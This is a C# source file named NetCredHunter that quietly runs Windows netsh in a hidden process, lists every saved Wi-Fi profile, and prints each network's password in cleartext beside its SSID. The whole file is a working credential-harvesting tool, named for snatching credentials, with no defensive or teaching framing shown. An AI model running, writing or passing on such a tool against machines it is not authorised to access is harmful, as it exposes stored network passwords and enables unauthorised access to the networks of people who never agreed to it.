using System;
using System.Collections.Generic;
using System.Diagnostics;

using static System.Console;

namespace NetCredHunter
{
    class NetSnatch
    {

        public static string ReturnAPs(Process proc)
        {

            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.StartInfo.FileName = "netsh";
            proc.StartInfo.Arguments = "wlan show profile";
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;
            proc.StartInfo.CreateNoWindow = true;

            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();
            string err = proc.StandardError.ReadToEnd();

            proc.WaitForExit();

            return output;

        }

        public static List<String> ParseAPList(Process proc)
        {
            string output = ReturnAPs(proc);
            List<String> SSIDs = new List<string>();
            string[] lines = output.Split('\r');

            for (int i = 0; i < lines.Length; i++) { if (lines[i].Contains("All")) { SSIDs.Add($"{lines[i].Split(':')[1].Trim(' ')}"); } }
            return SSIDs;
        }


        public static void ReturnKeys(Process proc, List<String> APs)
        {

            string args = null;

            WriteLine($"{"SSID",-25} {"Network Key"}");
            WriteLine($"{"----",-25} {"-----------"}");

            foreach (var ap in APs)
            {

                args = $"wlan show profile name={ap} key=clear";

                proc.StartInfo.Arguments = args;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string err = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                if (output.Contains("Key"))
                {
                    string[] lines = output.Split('\n');

                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].Contains("Key Content")) { WriteLine($"{ap,-25} {lines[i].Split(':')[1].Trim(' ')}"); }
                    }
                }

            }

        }

    }
}
